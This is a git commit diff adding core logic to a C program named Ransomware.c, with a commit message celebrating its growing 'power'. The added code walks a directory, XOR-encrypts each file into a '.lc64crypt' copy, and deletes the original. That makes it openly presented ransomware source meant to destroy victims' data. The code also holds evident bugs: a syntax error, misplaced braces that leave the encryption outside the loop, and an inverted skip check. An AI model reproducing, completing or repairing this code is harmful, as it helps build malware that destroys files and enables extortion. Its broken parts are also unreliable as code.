6f2d3172f0f2a4a14df1d772759c8bd6afc7fc60
leo1q <laraya1818@gmail.com>
2022-01-11 13:35:01 -0300

    Progress in the functionality and power of this program

--- ransomware/source/Ransomware.c
+++ ransomware/source/Ransomware.c
@@ -21,7 +21,7 @@
 int i = 0;
 
 FILE *buffer;
-FILE *cipherHered;
+FILE *ciphered;
 FILE *readme;
 
 float key[10] = 
@@ -73,6 +73,62 @@ int main(void)
     {
         fprintf(stderr, "ERROR: Cannot open the files directory\n", perror);
         exit(EXIT_FAILURE);
+    }
+
+    while ((direntp = readdir(dir)) != NULL)
+    {
+	    fprintf(stdout, "Checking file: %s\n", direntp -> d_name);
+	    strcpy(c_attrib.file, path);
+	    strcat(c_attrib.file, "/");
+	    strcat(c_attrib.file, direntp -> d_name);
+	    strcpy(c_attrib.c_file, path);
+	    strcat(c_attrib.c_file, "/");
+    }
+
+    if ((strcmp(direntp -> d_name, ".") == 0) && (strcmp(direntp -> d_name, "..") == 0))
+    {
+	    fprintf(stderr, "Skipping file: %s", c_attrib.file);
+    }
+    else if ((strcmp(direntp = d_name, ".") != 0) && (strcmp(direntp -> d_name, "..") != 0))
+    {
+	    buffer = fopen(c_attrib.file, "r"); // This open the file to cipher ;)
+
+	    if (buffer == NULL)
+	    {
+		    fputs("ERROR: Opened failure or file doesnt exists!", stderr);
+		    exit(EXIT_FAILURE);
+	    }
+
+	    strcat(c_attrib.c_file, direntp -> d_name);
+	    strcat(c_attrib.c_file, ".lc64crypt");
+
+	    ciphered = fopen(c_attrib.c_file, "w+"); // Create the ciphered file
+
+	    if (ciphered == NULL)
+	    {
+		    fputs("ERROR: Opened ciphered file failed", stderr);
+		    exit(EXIT_FAILURE);
+	    }
+
+	    while (!(feof(buffer)))
+	    {
+		    data.currentChar = fgetc(buffer);
+		    data.preCipheredChar = (char)((int)data.currentChar XOR c_attrib.password);
+
+		    for (i = 0; i <= 10; i++)
+			    precalculated = (sharedkey[i] * c_attrib.password);
+
+		    data.cipheredChar = (char)((int)data.preCipheredChar XOR (int)precalculated);
+		    fputc(data.cipheredChar, ciphered);
+	    }
+
+	    fclose(buffer);
+	    fclose(ciphered);
+	    
+	    strcpy(c_attrib.file, path);
+	    strcat(c_attrib.file, "/");
+	    strcat(c_attrib.file, direntp -> d_name);
+	    remove(c_attrib.file);
     }
     return 0;
 }
